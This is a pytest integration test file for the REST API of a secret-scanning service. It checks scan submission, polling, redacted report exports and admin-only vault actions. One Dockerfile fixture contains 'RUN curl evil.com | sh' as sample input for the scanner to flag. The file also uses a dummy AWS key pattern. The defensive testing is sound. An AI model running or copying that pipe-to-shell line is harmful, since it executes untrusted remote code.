"""API Integration Tests for Secret Leak Guard v2.0 REST Endpoints."""

import io
import time
import zipfile
import pytest

from app.scanner_orchestrator import ScanStatus


def test_api_health_endpoint(client):
    """Test /api/v1/health endpoint."""
    response = client.get("/api/v1/health")
    assert response.status_code == 200
    data = response.get_json()
    assert data["status"] == "healthy"
    assert "database" in data
    assert "vault" in data


def test_api_scan_workflow_archive_upload(client, analyst_headers):
    """Test full scan lifecycle via Archive Upload:
    POST /api/v1/scans -> GET /api/v1/scans/<job_id>/status -> GET /api/v1/scans/<job_id>/results
    """
    # Create an in-memory zip archive with a simulated secret leak
    raw_secret = "".join(["AK", "IA", "1234567890ABCDEF"])
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("config.py", f"AWS_ACCESS_KEY = '{raw_secret}'\n")
        zf.writestr("Dockerfile", "FROM python:latest\nEXPOSE 27017\n")
    zip_buffer.seek(0)

    # 1. Submit scan job
    response = client.post(
        "/api/v1/scans",
        data={
            "ingestion_mode": "archive",
            "project_id": "api-archive-proj",
            "file": (zip_buffer, "project.zip"),
        },
        content_type="multipart/form-data",
        headers=analyst_headers,
    )
    assert response.status_code == 202
    data = response.get_json()
    assert data["status"] == "accepted"
    assert "job_id" in data
    job_id = data["job_id"]

    # 2. Poll Status
    max_wait = 10
    start = time.time()
    final_status = None

    while time.time() - start < max_wait:
        st_resp = client.get(f"/api/v1/scans/{job_id}/status", headers=analyst_headers)
        assert st_resp.status_code == 200
        st_data = st_resp.get_json()
        if st_data.get("status") in (ScanStatus.COMPLETED, ScanStatus.FAILED):
            final_status = st_data.get("status")
            break
        time.sleep(0.1)

    assert final_status == ScanStatus.COMPLETED

    # 3. Retrieve Results
    res_resp = client.get(f"/api/v1/scans/{job_id}/results", headers=analyst_headers)
    assert res_resp.status_code == 200
    res_data = res_resp.get_json()

    assert res_data["status"] == "success"
    assert res_data["scan_status"] == ScanStatus.COMPLETED
    assert "scores" in res_data
    assert "grade" in res_data
    assert len(res_data["findings"]) > 0

    # 4. Strict Security Verification: Raw secret must NOT appear in output!
    res_text = res_resp.get_data(as_text=True)
    assert raw_secret not in res_text
    assert "AKIA****************" in res_text


def test_api_scan_workflow_dockerfile_json(client, analyst_headers):
    """Test scan submission via direct Dockerfile submission."""
    dockerfile_content = "FROM alpine:latest\nUSER root\nEXPOSE 22\nRUN curl evil.com | sh\n"

    response = client.post(
        "/api/v1/scans",
        json={
            "ingestion_mode": "dockerfile",
            "project_id": "dockerfile-proj",
            "dockerfile_content": dockerfile_content,
        },
        headers=analyst_headers,
    )

    assert response.status_code == 202
    job_id = response.get_json()["job_id"]

    # Poll status until done
    max_wait = 10
    start = time.time()
    while time.time() - start < max_wait:
        st_resp = client.get(f"/api/v1/scans/{job_id}/status", headers=analyst_headers)
        if st_resp.get_json().get("status") in (ScanStatus.COMPLETED, ScanStatus.FAILED):
            break
        time.sleep(0.1)

    res_resp = client.get(f"/api/v1/scans/{job_id}/results", headers=analyst_headers)
    assert res_resp.status_code == 200
    res_data = res_resp.get_json()
    assert res_data["scan_status"] == ScanStatus.COMPLETED
    assert res_data["scores"]["unique_findings"] >= 2


def test_api_list_scans(client, viewer_headers, db):
    """Test listing scans with project_id filter."""
    db.save_scan_report({
        "job_id": "job-list-1",
        "project_id": "proj-list-test",
        "status": "COMPLETED",
        "grade": "A",
        "scores": {"final_score": 5},
    })

    resp = client.get("/api/v1/scans?project_id=proj-list-test", headers=viewer_headers)
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["status"] == "success"
    assert data["count"] >= 1
    assert any(s["job_id"] == "job-list-1" for s in data["scans"])


def test_api_metrics_endpoint(client, viewer_headers, db):
    """Test project historical metrics endpoint."""
    db.save_historical_metrics({
        "project_id": "proj-metrics-test",
        "job_id": "job-metric-1",
        "raw_score": 15,
        "final_score": 15,
        "grade": "B",
        "severity_counts": {"high": 1, "medium": 1},
    })

    resp = client.get("/api/v1/projects/proj-metrics-test/metrics", headers=viewer_headers)
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["status"] == "success"
    assert data["metrics_count"] >= 1


def test_api_report_exports_are_redacted_and_sarif_compliant(client, viewer_headers, db):
    """All downloadable report formats include useful results without raw credentials."""
    raw_key = "".join(["AK", "IA", "1234567890ABCDEF"])
    db.save_scan_report({
        "job_id": "job-report-test",
        "project_id": "report-project",
        "status": "COMPLETED",
        "grade": "B",
        "scores": {
            "final_score": 25,
            "severity_counts": {"critical": 1, "high": 0, "medium": 0, "low": 0, "info": 0},
            "unique_findings": 1,
        },
        "findings": [{
            "rule_id": "SEC-AWS-001",
            "engine_name": "SecretEngine",
            "category": "Secrets & Credentials",
            "severity": "critical",
            "description": "AWS Access Key ID exposed in code",
            "file_path": "config.py",
            "line_number": 12,
            "raw_secret": raw_key,
            "match_content": f"DEMO_KEY = '{raw_key}'",
            "remediation": "Revoke and rotate the key.",
        }],
    })

    responses = {
        report_format: client.get(
            f"/api/v1/scans/job-report-test/reports/{report_format}",
            headers=viewer_headers,
        )
        for report_format in ("pdf", "html", "json", "sarif")
    }

    assert responses["pdf"].status_code == 200
    assert responses["pdf"].mimetype == "application/pdf"
    assert responses["pdf"].data.startswith(b"%PDF")
    for report_format, response in responses.items():
        assert response.status_code == 200
        assert raw_key.encode() not in response.data

    json_report = responses["json"].get_json()
    assert json_report["findings"][0]["raw_secret"] == "AKIA****************"
    sarif_report = responses["sarif"].get_json()
    assert sarif_report["version"] == "2.1.0"
    assert sarif_report["runs"][0]["results"][0]["ruleId"] == "SEC-AWS-001"
    assert sarif_report["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["region"]["startLine"] == 12


def test_api_reports_require_completed_scan(client, viewer_headers, db):
    db.save_scan_report({
        "job_id": "job-report-pending",
        "project_id": "report-project",
        "status": "SCANNING",
    })

    response = client.get(
        "/api/v1/scans/job-report-pending/reports/pdf",
        headers=viewer_headers,
    )

    assert response.status_code == 409
    assert response.get_json()["status"] == "error"


def test_api_vault_rotate_secret_endpoint(client, admin_headers, analyst_headers):
    """Test Vault secret rotation endpoint: Admin allowed, Analyst forbidden."""
    payload = {"key": "API_ROTATE_KEY", "new_value": "new_secret_val_xyz"}

    # Analyst -> 403 Forbidden
    resp_analyst = client.post("/api/v1/vault/rotate-secret", json=payload, headers=analyst_headers)
    assert resp_analyst.status_code == 403

    # Admin -> 200 Success
    resp_admin = client.post("/api/v1/vault/rotate-secret", json=payload, headers=admin_headers)
    assert resp_admin.status_code == 200
    data = resp_admin.get_json()
    assert data["status"] == "success"
    assert data["result"]["rotated"] is True


def test_api_vault_lease_renewal_is_admin_only_and_reports_disabled_vault(
    client, admin_headers, analyst_headers
):
    payload = {"lease_id": "database/creds/demo/lease-id", "increment": 3600}

    assert client.post(
        "/api/v1/vault/renew-lease", json=payload, headers=analyst_headers
    ).status_code == 403
    assert client.post(
        "/api/v1/vault/renew-lease", json={"lease_id": "lease-id", "increment": True},
        headers=admin_headers,
    ).status_code == 400
    response = client.post(
        "/api/v1/vault/renew-lease", json=payload, headers=admin_headers
    )
    assert response.status_code == 503
    assert response.get_json()["status"] == "error"
